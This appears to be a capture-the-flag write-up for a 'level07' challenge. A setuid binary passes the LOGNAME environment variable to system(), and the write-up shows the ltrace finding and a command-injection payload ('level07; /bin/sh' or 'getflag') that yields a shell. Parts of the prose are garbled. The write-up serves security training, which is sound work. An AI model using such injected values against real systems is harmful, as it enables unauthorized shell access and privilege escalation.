# Level07 Challenge Analysis

## Observations

1. The `level07` binary relies on environment variables, specifically `LOGNAME`, as evident from the `getenv("LOGNAME")` call in the `ltrace` output.
2. The binary uses the value of `LOGNAME` in a command executed via the `system()` function.
3. The `ltrace` and `strace` outputs show that the binary essentially executes a command resembling:
```
/bin/echo $LOGNAME
> level07
```
## Potential Exploit

The use of the `system()` function introduces a potential command injection vulnerability. By carefully crafting the `LOGNAME` variable, arbitrary shell commands can be executed.

## Exploitation Steps

1. **Identify the Vulnerability**:
The program uses `system()` to execute `/bin/echo $LOGNAME`. Since `system()` invokes a shell, we can inject additional commands into `LOGNAME`.

2. **Craft the Payload**:
Set the `LOGNAME` environment variable to a value that injects malicious commands. For example:
sens the bihavior of echo when we set chain of argument it print the first and the others got executed we can do:
echo param1; param2; param3 the first one is the one that will be printed and the others will be executed

```bash
export LOGNAME="level07; /bin/sh" 
or 
export LOGNAME="level07; getflag" 

Here, the ; allows chaining commands, and /bin/sh (getflag) spawns a shell.

Execute the Binary: Run the level07 binary with the crafted LOGNAME:

./level07
Gain Access: The injected /bin/sh command opens an interactive shell, potentially providing escalated access.
```
## Conclusion
This challenge demonstrates the importance of sanitizing inputs passed to system calls like system() to prevent command injection vulnerabilities. Always validate and sanitize environment variables and user inputs.

